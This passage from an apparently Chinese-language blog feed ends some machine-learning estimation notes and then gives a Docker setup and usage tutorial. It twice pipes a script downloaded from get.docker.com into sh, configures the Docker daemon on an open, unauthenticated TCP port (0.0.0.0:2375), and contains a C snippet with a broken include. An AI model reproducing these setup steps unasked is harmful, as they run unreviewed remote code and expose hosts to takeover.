</li>
<li>求特征向量方差，<code>Ly=λy</code>，将点xi映射到(y1, y2, …)i</li>
</ul>
<h2 id="感知器"><a href="#感知器" class="headerlink" title="感知器"></a>感知器</h2><p>线性可分。</p>
<p>解向量和解区。</p>
<h2 id="最小平方误差判别"><a href="#最小平方误差判别" class="headerlink" title="最小平方误差判别"></a>最小平方误差判别</h2><p>不知道是否线性可分。</p>
<h2 id="线性支持向量机"><a href="#线性支持向量机" class="headerlink" title="线性支持向量机"></a>线性支持向量机</h2><h2 id="多类线性分类器"><a href="#多类线性分类器" class="headerlink" title="多类线性分类器"></a>多类线性分类器</h2><h1 id="参数估计"><a href="#参数估计" class="headerlink" title="参数估计"></a>参数估计</h1><h2 id="最大似然估计"><a href="#最大似然估计" class="headerlink" title="最大似然估计"></a>最大似然估计</h2><p>仅从训练样本出发，参数看做确定变量。</p>
<h2 id="贝叶斯估计"><a href="#贝叶斯估计" class="headerlink" title="贝叶斯估计"></a>贝叶斯估计</h2><p>从参数的先验知识和样本出发，把参数看成未知的随机变量。</p>
<p>将离散的决策状态变为连续的估计。<br>条件风险：损失函数*概率密度 的 积分。</p>
<h2 id="差别"><a href="#差别" class="headerlink" title="差别"></a>差别</h2><p>最大似然估计：没有先验知识，假设模型不变，计算简单。</p>
<p>贝叶斯：利用参数的先验信息，估计的概率模型相比于假设模型会发生变化，可理解性差，计算复杂。</p>
<p>吉布斯采样：对后验分布随机采样，用参数的算数平均来估计期望。<br>Statistical Pattern Recognition<br>蒙特卡洛<br>马尔科夫链 </p>
<h1 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h1><p>YOLO 实时快速目标检测方法</p>
]]></content>
      <categories>
        <category>计算机理论</category>
      </categories>
      <tags>
        <tag>机器学习理论</tag>
        <tag>贝叶斯</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker</title>
    <url>/2020/02/04/%E8%BF%90%E7%BB%B4/Docker/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>




<h2 id="Docker-准备工作"><a href="#Docker-准备工作" class="headerlink" title="Docker 准备工作"></a>Docker 准备工作</h2><h3 id="Docker-Playground"><a href="#Docker-Playground" class="headerlink" title="Docker Playground"></a>Docker Playground</h3><p><a href="https://labs.play-with-docker.com/">Docker Playground</a></p>
<p>这是一个不用下载的，在线就可以用的Docker。使用需要使用Docker的账号密码，可以去注册一个。</p>
<h3 id="下载-Docker-已弃用"><a href="#下载-Docker-已弃用" class="headerlink" title="下载 Docker (已弃用)"></a>下载 Docker (已弃用)</h3><p>Docker分为社区版和企业版。这里主要介绍社区版。</p>
<p>进入官方<a href="https://github.com/docker/toolbox/releases">DockerToolbox下载页面</a>，按照<a href="https://docs.docker.com/toolbox/toolbox_install_windows/">安装教程</a>安装Docker Toolbox。</p>
<p>国内阿里云[DockerToolBox下载页面]<br>(<a href="http://mirrors.aliyun.com/docker-toolbox/windows/docker-toolbox/DockerToolbox-18.03.0-ce.exe)%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%AE%98%E6%96%B9%E7%9A%84%E9%80%9F%E5%BA%A6%E5%A4%AA%E6%85%A2%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%88%87%E6%8D%A2%E5%88%B0%E8%BF%99%E9%87%8C%E3%80%82%E8%BF%99%E9%87%8C%E7%9A%84Docker%E4%B8%8D%E6%98%AF%E6%9C%80%E6%96%B0%E7%89%88%E7%9A%84%E3%80%82">http://mirrors.aliyun.com/docker-toolbox/windows/docker-toolbox/DockerToolbox-18.03.0-ce.exe)，如果官方的速度太慢，可以切换到这里。这里的Docker不是最新版的。</a></p>
<p>其他<a href="https://get.daocloud.io/#install-docker">下载页面</a>，包含Ubuntu下的一键安装脚本。</p>
<p>安装过程会自动安装VirtualBox，Dokcer，Docker-compose以及Kitematic。</p>
<p><a href="https://hub.docker.com/">Docker 容器查询</a><br><a href="https://docs.docker.com/">Docker 官方文档</a><br><a href="https://www.w3cschool.cn/reqsgr/3bue8ozt.html">W3C Docker 参考文档</a></p>
<h3 id="下载-Docker"><a href="#下载-Docker" class="headerlink" title="下载 Docker"></a>下载 Docker</h3><p>Windows 10及以上版本可以到<a href="https://www.docker.com/get-started/">官网下载</a>。安装前需要先安装相关组件，在<code>控制面板-&gt;程序-&gt;程序和功能-&gt;启用和关闭Windows功能</code>中安装<code>适用于Linux的Windows子系统</code>，安装完成后再安装<a href="https://docs.microsoft.com/zh-cn/windows/wsl/wsl2-kernel">WSL2升级包</a>。安装完成后再安装Docker即可。</p>
<p>Linux系统安装过程更为简单，只需要执行下面的命令即可。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -sSL https://get.docker.com | sh</span><br></pre></td></tr></table></figure>

<p>Docker Compose安装：到Github上下载<a href="https://github.com/docker/compose/releases">二进制包</a>，添加到环境变量中即可。</p>
<h3 id="配置-Docker"><a href="#配置-Docker" class="headerlink" title="配置 Docker"></a>配置 Docker</h3><p>使用Docker，Docker会默认为我们创建一个虚拟机，下载的Image也都会存储在虚拟机中。默认情况下，虚拟机会存储在用户文档下的<code>.docker</code>目录下。若想改变虚拟机默认存储，可以配置环境变量<code>MACHINE_STORAGE_PATH</code>即可。</p>
<p>（如果遇到Waiting for an IP无限等待，可能是OpenSSH的问题，这个是Win10上内置的功能）</p>
<p>运行桌面上的<code>Docker Quickstart Terminal</code>，首次启动Docker会为我们创建一台虚拟机，并在这个虚拟机目录下创建配置文件。打开配置文件（如果修改过就去改后的目录找）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\用户名\.docker\machine\machines\default\config.json</span><br></pre></td></tr></table></figure>

<p>在<code>HostOptions</code>-&gt;<code>EngineOptions</code>-&gt;<code>RegistryMirror</code>中配置为：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;RegistryMirror&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;https://sfpj1t4c.mirror.aliyuncs.com&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>新版本为：上方的设置按钮，<code>Docker Engine</code>中配置。</p>
<p>此处的镜像地址最好是到阿里云找一个。登录阿里云，点击产品与服务，选择容器镜像服务-&gt;镜像中心-&gt;镜像加速器。</p>
<p>配置完成后，重新运行桌面上的<code>Docker Quickstart Terminal</code>。</p>
<h3 id="首次使用-Docker"><a href="#首次使用-Docker" class="headerlink" title="首次使用 Docker"></a>首次使用 Docker</h3><p>首先进入<code>Docker Quickstart Terminal</code>后，在项目目录执行如下内容，用来测试docker是否正常。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run ubuntu:16.04 /bin/echo <span class="string">&quot;Hello world&quot;</span></span><br></pre></td></tr></table></figure>

<p>提示Hello World说明配置成功。</p>
<h3 id="Docker-安装了什么"><a href="#Docker-安装了什么" class="headerlink" title="Docker 安装了什么"></a>Docker 安装了什么</h3><p>安装完成后，我们来简单梳理一下都做了什么。</p>
<p>Docker在我们的电脑上安装了：</p>
<ul>
<li>VirtualBox：虚拟机工具。</li>
<li>Docker Machine：虚拟机管理工具。</li>
<li>Docker Compose：Docker脚本执行工具。</li>
<li>Docker Client</li>
</ul>
<p>完成安装后，首次运行<code>Docker Quickstart Terminal</code>，Docker就会创建一个虚拟机，作为我们的Docker Server，而我们的本地系统则成为了Docker Client。</p>
<p>之后我们使用的容器将全部运行在这个虚拟机中。查看虚拟机的IP可以使用命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker-machine <span class="built_in">env</span></span><br></pre></td></tr></table></figure>

<h3 id="Ubuntu-下的-Docker"><a href="#Ubuntu-下的-Docker" class="headerlink" title="Ubuntu 下的 Docker"></a>Ubuntu 下的 Docker</h3><p>如果图个方便，那么直接安装：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo apt-get install -y docker.io containerd runc docker-compose</span><br></pre></td></tr></table></figure>

<p>如果想去官方下载最新版，那么可以按照官方的程序来一遍。</p>
<p><a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/">Docker for Linux安装方法</a></p>
<p>按照官网给出的安装方法安装Docker。此外，官网还给出了下载Docker包安装和卸载Docker的方法。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 首先删除旧版本</span></span><br><span class="line">sudo apt-get remove docker docker-engine docker.io containerd runc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新下载源</span></span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置apt</span></span><br><span class="line">sudo apt-get install -y \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg-agent \</span><br><span class="line">    software-properties-common</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加Docker源秘钥</span></span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加秘钥</span></span><br><span class="line">sudo apt-key fingerprint 0EBFCD88</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加Docker源</span></span><br><span class="line">sudo add-apt-repository \</span><br><span class="line">   <span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">   <span class="subst">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string">   stable&quot;</span></span><br><span class="line"></span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 Docker Community</span></span><br><span class="line">sudo apt-get install -y docker-ce docker-ce-cli containerd.io</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果想要安装其他版本，可以尝试下面的操作</span></span><br><span class="line"><span class="comment"># 列出可以按照的Docker Community版本</span></span><br><span class="line">apt-cache madison docker-ce</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择一个版本安装Docker Community，注意替换下面&lt;...&gt;内容</span></span><br><span class="line">sudo apt-get install -y docker-ce=&lt;VERSION_STRING&gt; docker-ce-cli=&lt;VERSION_STRING&gt; containerd.io</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装完成，测试安装结果</span></span><br><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure>

<p>修改Docker配置文件：</p>
<p>在&#x2F;etc&#x2F;docker&#x2F;daemon.json中增加如下内容：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://sfpj1t4c.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处的镜像地址最好是到阿里云找一个。登录阿里云，点击产品与服务，选择容器镜像服务-&gt;镜像中心-&gt;镜像加速器。</p>
<h3 id="Ubuntu-快速安装指南"><a href="#Ubuntu-快速安装指南" class="headerlink" title="Ubuntu 快速安装指南"></a>Ubuntu 快速安装指南</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl -sSL https://get.docker.com | sh  <span class="comment"># 一键安装</span></span><br><span class="line">sudo <span class="built_in">cat</span>&gt;&gt;/etc/docker/daemon.json&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  &quot;registry-mirrors&quot;: [&quot;https://sfpj1t4c.mirror.aliyuncs.com&quot;]</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">sudo systemctl daemon-reload  <span class="comment"># 加载阿里云加速镜像</span></span><br><span class="line">sudo systemctl restart docker</span><br><span class="line">sudo groupadd docker    <span class="comment"># 添加当前用户到docker组</span></span><br><span class="line">sudo usermod -aG docker <span class="variable">$USER</span></span><br><span class="line">newgrp docker</span><br><span class="line">sudo apt-get install -y docker-compose   <span class="comment"># 安装 docker compose</span></span><br></pre></td></tr></table></figure>


<p>配置<code>VS Code</code>远程开发，修改<code>/lib/systemd/system/docker.service</code>文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ExecStart=/usr/bin/dockerd -H unix:///var/run/docker.sock -H tcp://0.0.0.0:2375</span><br></pre></td></tr></table></figure>

<p>再重新加载Docker</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload  <span class="comment"># 加载阿里云加速镜像</span></span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<p><code>VS Code</code>安装<code>docker</code>插件，打开配置，输入<code>docker:host</code>，编辑<code>host</code>。</p>
<p>下载<a href="https://github.com/StefanScherer/docker-cli-builder/releases/">Docker Cli</a>，加入到环境变量中。</p>
<p>在<code>任务管理器-&gt;服务-&gt;右键-&gt;打开服务</code>中启动<code>SSH Agent</code>服务（OpenSSH Authentication Agent）。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">get-service ssh*  <span class="comment"># 查看服务状态</span></span><br></pre></td></tr></table></figure>

<p>在本地主机上配置SSH，生成公钥<code>id_rsa.pub</code>和私钥<code>id_rsa</code>。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br></pre></td></tr></table></figure>

<p>公钥放到远程主机上，追加到<code>~/.ssh/authorized_keys</code>文件中。<br>本地执行命令，添加私钥。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh-add id_rsa</span><br></pre></td></tr></table></figure>

<p>配置本地Docker的Context</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker context create context_name --docker <span class="string">&quot;host=ssh://user@host&quot;</span></span><br><span class="line">docker context use context_name</span><br><span class="line">docker info  <span class="comment"># 测试结果</span></span><br></pre></td></tr></table></figure>


<h3 id="GPU-支持"><a href="#GPU-支持" class="headerlink" title="GPU 支持"></a>GPU 支持</h3><p><a href="https://github.com/NVIDIA/nvidia-docker">NVIDIA Docker</a></p>
<p>如果要安装Docker的GPU支持，可以下载该模块。实现GPU支持后，可以使用Tensorflow-GPU的Docker。</p>
<h2 id="Docker-原理与架构"><a href="#Docker-原理与架构" class="headerlink" title="Docker 原理与架构"></a>Docker 原理与架构</h2><p>Docker 是一个平台，它通过Docker Engine把底层的设备与上层应用隔离开。Docker Engine是一个后台进程，即是一个REST API Server，它还有一个CLI接口（docker）。</p>
<p>Docker 包含 Client 与 Server 。Docker Client 通过命令方式控制 Docker Server，在Server上操作Container，Image等。Docker Server通过代码仓库或Docker Hub获取Docker镜像。</p>
<h2 id="Docker-Image"><a href="#Docker-Image" class="headerlink" title="Docker Image"></a>Docker Image</h2><p>Image 本身是只读的。Docker搭建的应用的过程就是将几个Image一层一层叠加上去的过程。例如在Ubuntu Image层上叠加Apache Image层，在上面再叠加一个PHP Image层，就可以实现一个网站。Image之间可以共享同一层，例如Apache与MySQL可以在同一层上。</p>
<h3 id="使用-Image"><a href="#使用-Image" class="headerlink" title="使用 Image"></a>使用 Image</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看 image</span></span><br><span class="line">docker image <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除 image</span></span><br><span class="line">docker image <span class="built_in">rm</span> image_id</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 image</span></span><br><span class="line">docker pull ubuntu:14.04</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 Dockerfile 创建 image -t 表示 Tag . 表示当前目录</span></span><br><span class="line">docker build -t author/name:version .</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果要查询Image，可以去<a href="https://hub.docker.com/">Docker Hub</a>上查找。</p>
<h3 id="创建-Image"><a href="#创建-Image" class="headerlink" title="创建 Image"></a>创建 Image</h3><p>如果想要自己创建一个Base Image，可以这样做。</p>
<p>例如我们编写一个 c 程序。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim main.c</span><br></pre></td></tr></table></figure>

<p>编辑程序代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stido.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译程序：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gcc -static main.c -o main</span><br></pre></td></tr></table></figure>

<p>执行程序查看效果：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./main</span><br></pre></td></tr></table></figure>

<p>编写Dockerfile文件：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim Dockerfile</span><br></pre></td></tr></table></figure>

<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># scratch 表示没有Base</span></span><br><span class="line"><span class="keyword">FROM</span> scratch</span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> main /</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/main&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<p>构建运行Image：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 构建</span></span><br><span class="line">docker build -t author/image_tag .</span><br><span class="line"><span class="comment"># 查看Image层数</span></span><br><span class="line">docker <span class="built_in">history</span> image_id</span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">docker run author/image_tag</span><br></pre></td></tr></table></figure>

<h3 id="删除-Image"><a href="#删除-Image" class="headerlink" title="删除 Image"></a>删除 Image</h3><p>删除Image：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker image <span class="built_in">rm</span> image_id</span><br><span class="line">docker rmi image_id</span><br></pre></td></tr></table></figure>
















<h2 id="Docker-Container"><a href="#Docker-Container" class="headerlink" title="Docker Container"></a>Docker Container</h2><p>Container 是一种可读可写的层。我们在运行一个Image时，Docker会在这个Image上添加Container层，用于读写程序运行时产生的数据。</p>
<p>我们也可以把Container与Image类比成对象和类。Image只读，负责存储app，可以当做是一个类；Container则是负责运行app，可以当做是一个对象。</p>
<h3 id="使用-Container"><a href="#使用-Container" class="headerlink" title="使用 Container"></a>使用 Container</h3><p>运行一个Image，就创建了一个Container。Container在运行完成后就会退出。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run ubuntu</span><br></pre></td></tr></table></figure>

<p>运行完成后：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看所有容器，-a 表示包括已经结束运行的</span></span><br><span class="line">docker container <span class="built_in">ls</span> -a</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">docker ps -a</span><br><span class="line"><span class="comment"># 只显示container id</span></span><br><span class="line">docker container <span class="built_in">ls</span> -aq</span><br></pre></td></tr></table></figure>

<p>使用如下命令可以进入容器内做交互，注意，这里的所有数据会在Container结束运行时消失：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -i 表示交互  -t 表示标准输入输出</span></span><br><span class="line">docker run -it ubuntu</span><br></pre></td></tr></table></figure>

<p>删除Container：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker container <span class="built_in">rm</span> container_id</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">docker <span class="built_in">rm</span> container_id</span><br><span class="line"><span class="comment"># 批量删除所有container</span></span><br><span class="line">docker <span class="built_in">rm</span> $(docker container <span class="built_in">ls</span> -aq)</span><br><span class="line"><span class="comment"># 批量删除所有退出的container</span></span><br><span class="line">docker <span class="built_in">rm</span> $(docker container <span class="built_in">ls</span> -f <span class="string">&quot;status=exited&quot;</span> -q)</span><br></pre></td></tr></table></figure>

<p>当我们在container中产了数据，做了某些操作，我们就可以通过commit方式将修改后的contianer变为image。</p>
<p>从Container创建Image</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker container commit <span class="comment"># 同docker commit</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 例如</span></span><br><span class="line">docker commit contaienr_name image_name</span><br></pre></td></tr></table></figure>

<p>我们也可以从Dockerfile创建container。首先创建一个空的目录，这个目录下的除配置文件外的所有文件将会被打包进入image。我们创建一个配置文件Dockerfile：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sudo apt-get install -y vim</span></span><br></pre></td></tr></table></figure>

<p>执行命令打包：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker container build  <span class="comment"># 同 docker build</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 例如</span></span><br><span class="line">docker build -t image_name .</span><br></pre></td></tr></table></figure>

<p>进入运行中的container：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入命令行</span></span><br><span class="line">docker <span class="built_in">exec</span> -it container_id /bin/bash</span><br><span class="line"><span class="comment"># 显示ip</span></span><br><span class="line">docker <span class="built_in">exec</span> -it container_id ip a</span><br></pre></td></tr></table></figure>

<p>停止container：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker stop container_id</span><br></pre></td></tr></table></figure>

<p>运行时给container命名：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -d --name=demo image_name</span><br></pre></td></tr></table></figure>

<p>这样就可以不用再操作container_id了，而是可以直接操作name。</p>
<p>查看container信息：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker inspect container_id</span><br></pre></td></tr></table></figure>

<p>查看container输出信息：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker logs container_id</span><br></pre></td></tr></table></figure>

<h3 id="上传自制-Image"><a href="#上传自制-Image" class="headerlink" title="上传自制 Image"></a>上传自制 Image</h3><p>首先注册登录Docker，并进入Docker Hub。</p>
<p>在本地命令行：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 登录账号</span></span><br><span class="line">docker login</span><br><span class="line"><span class="comment"># 推送 image</span></span><br><span class="line">docker push author/image:latest</span><br><span class="line"><span class="comment"># 被推送的image必须是 author/image:latest 格式，否则没有权限推送</span></span><br></pre></td></tr></table></figure>

<p>进入Docker Hub就可以看见自己推送的Image了。</p>
<p>也可以让Docker与Github关联。在Docker页面，Create，Create Automated Build里面，选择Link Accounts关联Github。在Github里创建Repository，将Dockerfile上传到代码仓库。Docker的服务器会帮我们Build镜像。</p>
<p>如果要搭建自己的Image仓库，可以在Docker hub里面搜索registry，按照里面的教程操作即可。</p>
<h3 id="打包一个Python程序到Image"><a href="#打包一个Python程序到Image" class="headerlink" title="打包一个Python程序到Image"></a>打包一个Python程序到Image</h3><h4 id="创建一个Python脚本"><a href="#创建一个Python脚本" class="headerlink" title="创建一个Python脚本"></a>创建一个Python脚本</h4><p>首先创建Docker打包目录，在目录下创建文件<code>app.py</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello docker&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<h4 id="创建一个-Dockerfile"><a href="#创建一个-Dockerfile" class="headerlink" title="创建一个 Dockerfile"></a>创建一个 Dockerfile</h4><p>再创建Dockerfile：</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">2.7</span></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> maintainer=<span class="string">&quot;Author&quot;</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install flask</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> app.py /app/</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">5000</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;python&quot;</span>, <span class="string">&quot;app.py&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<h4 id="创建-Image-1"><a href="#创建-Image-1" class="headerlink" title="创建 Image"></a>创建 Image</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker build -t author/image_name .</span><br><span class="line"><span class="comment"># -d 参数后台执行</span></span><br><span class="line">docker run -d author/image_name</span><br></pre></td></tr></table></figure>

<p>如果创建失败，遇到bug想要调试，可以查看build日志，找到最后一个创建成功的Step，复制其id，并通过命令进入bash环境：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -it <span class="built_in">id</span> /bin/bash </span><br></pre></td></tr></table></figure>

<h3 id="Docker-压力测试"><a href="#Docker-压力测试" class="headerlink" title="Docker 压力测试"></a>Docker 压力测试</h3><p>进入docker容器中：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -it ubuntu</span><br></pre></td></tr></table></figure>

<p>安装stress工具：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; sudo apt-get install -y stress</span><br></pre></td></tr></table></figure>

<p>使用stress：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vm Worker数 </span></span><br><span class="line"><span class="comment"># verbose 打印日志</span></span><br><span class="line"><span class="comment"># 功能：反复分配释放内存，默认256MB</span></span><br><span class="line">stress --vm 1 --verbose</span><br><span class="line"></span><br><span class="line"><span class="comment"># vm-bytes 申请释放内存大小</span></span><br></pre></td></tr></table></figure>

<p>或使用Dockerfile</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -y stress</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/usr/bin/stress&quot;</span>]</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;&quot;</span>]   <span class="comment"># 从命令行接受参数</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker build -t image_tag .</span><br><span class="line">docker run -it image_tag --vm 1 --verbose</span><br></pre></td></tr></table></figure>

<h3 id="创建一个常开的Container"><a href="#创建一个常开的Container" class="headerlink" title="创建一个常开的Container"></a>创建一个常开的Container</h3><p>使用busybox这个Image，可以创建一个常开的Container：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -d --name <span class="built_in">test</span> busybox /bin/sh -c <span class="string">&quot;while true; do sleep 3600; done&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="限制Container资源"><a href="#限制Container资源" class="headerlink" title="限制Container资源"></a>限制Container资源</h3><p>在开启Container时，可以通过添加参数限制Container的资源，包括cpu个数，内存大小等：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># --memory 内存 --cpu-shares cpu相对占用</span></span><br><span class="line">docker run --memory=200M --cpu-shares=10 image_tag --vm 1 --cpu 1 --verbose</span><br><span class="line">docker run --memory=200M --cpu-shares=5 image_tag --vm 1 --cpu 1 --verbose</span><br><span class="line"><span class="comment"># 想当与2:1占用一个cpu</span></span><br></pre></td></tr></table></figure>




<h2 id="Docker-Network"><a href="#Docker-Network" class="headerlink" title="Docker Network"></a>Docker Network</h2><p>单机Network有三种模式：</p>
<ul>
<li>Bridge Network</li>
<li>Host Network</li>
<li>None Netw</li>
</ul>
<p>多机Network有 Overlay Network。</p>
<h3 id="手工配置-Linux-Network-命名空间"><a href="#手工配置-Linux-Network-命名空间" class="headerlink" title="手工配置 Linux Network 命名空间"></a>手工配置 Linux Network 命名空间</h3><p>Network命名空间（Namespace）是一种虚拟化技术，它可以将一个物理机虚拟化成多个虚拟机。一个命名空间相当于一个虚拟主机。我们可以通过配置命名空间下的虚拟端口，可以完成虚拟机，也就是命名空间中的网络连接。这也是docker容器的底层技术。</p>
<p>Linux的Network命名空间有关命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看所有命名空间</span></span><br><span class="line">sudo ip netns list</span><br><span class="line"><span class="comment"># 添加命名空间</span></span><br><span class="line">sudo ip netns add net_test1</span><br><span class="line"><span class="comment"># 删除命名空间</span></span><br><span class="line">sudo ip netns delete net_test1</span><br><span class="line"><span class="comment"># 查看命名空间下的IP</span></span><br><span class="line">sudo ip netns <span class="built_in">exec</span> net_test1 ip a</span><br><span class="line"><span class="comment"># 会看到该命名空间下的IP没有任何启动的虚拟网卡</span></span><br></pre></td></tr></table></figure>

<p>配置虚拟网络的过程如下：</p>
